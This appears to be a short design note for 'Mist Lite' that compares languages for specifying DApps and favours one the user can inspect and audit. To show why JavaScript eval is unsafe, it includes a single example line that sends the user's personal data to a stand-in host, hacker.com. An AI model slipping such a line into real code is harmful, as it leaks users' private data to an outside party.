## Mist Lite

## The language problem

"In what language should DApps be specified?"

- JavaScript, with `eval(...)`?

    1. Unsafe.

    ```javascript
    ... deeply inside a giantic js bundle ...
    fetch("http://hacker.com/" + window.myPersonalData);
    ```

- JavaScript, inside a sandboxed iFrame?

    1. How to avoid infinite loops?

    2. Hacky and awkward in general, a lot could go wrong.

    3. Could work, though; not discarded.

- JavaScript, interpreted?

    1. Slow.

    2. Shipping a complete interpreter on web version would be prohibitive.

    3. The [smallest](https://github.com/NeilFraser/JS-Interpreter) interpreter I know isn't complete.

- WebAssembly?

    1. Difficult to inspect, edit and audit.
    
        The calculus of constructions preserves the high-level logical structure of the program, allowing it to be translated to a high-level source code, which the user can inspect, edit and audit. WASM destroys such structure, forcing the user to see assembly-like code.

    2. Awkward FFI.
    
        For the same reason above, CoC can be compiled directly to native terms, allowing it to be used without encoding an ABI.

    3. Bigger bundles.

- Something else?

    1. What?
